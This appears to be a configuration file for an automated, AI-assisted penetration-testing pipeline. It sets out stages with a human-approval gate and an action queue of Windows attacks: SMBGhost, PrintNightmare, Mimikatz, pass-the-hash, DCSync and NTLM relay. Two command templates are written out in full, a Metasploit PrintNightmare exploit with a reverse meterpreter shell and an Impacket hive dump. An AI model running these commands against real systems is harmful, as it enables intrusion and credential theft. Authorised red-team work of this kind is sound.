goal: From authorised edge evidence, auto-validate safe exposures, branch when celebrity exploits are patched, unlock high-risk impact only with proof plan + operator approval, then expand via pivot.
summary: Closed-loop mission: surface → safe validation → branch brain → impact gate → pivot expand → debrief.

stages.title: Mission brief
stages.description: Scope and goal locked. Evidence-closed-loop orchestrator armed.

stages.title: Surface lock
stages.description: Ingest Ethernet/LAN-authorised scan evidence into the attack graph.

stages.title: Hypothesis
stages.description: Catalog matches known modules; unknown surfaces enter research queue. AI may rank but never invents module paths.

stages.title: Safe validation storm
stages.description: Automatically queue low/medium risk catalog scanners and safe MS17/BlueKeep checks. No shells.

stages.title: Branch brain
stages.description: Evaluate evidence flags. Patched celebrity vulns suppress exploits and unlock alternate paths.

stages.title: Impact gate
stages.description: High-risk catalog exploits and web footholds wait for human approval + proof plan.

stages.title: Alternate lateral (non-EB)
stages.description: When EternalBlue-class paths are suppressed, plan catalog lateral techniques (enum, signing, creds-oriented).

stages.title: Pivot expand
stages.description: After foothold proof, expand into internal Ethernet segments (USERS/ADMIN VLANs). Direct path must be blocked for true pivot narrative.

stages.title: Mission debrief
stages.description: Compile proved findings, suppressed exploits, research queue, MITRE chain, and blue-team timeline.

action_queue.title: SMBGhost (CVE-2020-0796) local privilege escalation

action_queue.title: PrintNightmare (CVE-2021-34527) via proxychains

action_queue.command_template: proxychains -q msfconsole -q -x 'use exploit/windows/dcerpc/cve_2021_1675_printnightmare; set RHOSTS {target_ip}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {kali_ip}; set LPORT 4449; run'

action_queue.title: Mimikatz credential extraction via proxychains
action_queue.reason: Post-exploitation: extract plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS memory via Mimikatz over WMIExec.

action_queue.title: Pass-the-Hash lateral movement
action_queue.reason: Pass-the-Hash: use extracted NTLM hashes to move laterally without knowing the plaintext password.

action_queue.title: DCSync — replicate domain credentials
action_queue.reason: DCSync: replicate domain credentials from a Domain Controller using Replication-Get-Changes-All rights.

action_queue.title: SAM & SYSTEM hive dump
action_queue.reason: Dump SAM and SYSTEM registry hives from a compromised Windows host for offline hash extraction.
action_queue.command_template: proxychains -q python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{domain}/{username}:{password}@{target_ip}' 'reg save HKLM\SAM C:\Windows\Temp\sam.save && reg save HKLM\SYSTEM C:\Windows\Temp\system.save'

action_queue.title: NTLM relay attack (responder + ntlmrelayx)
action_queue.reason: NTLM relay: use Responder to poison name resolution, then relay captured hashes to SMB targets. Requires network-level access.
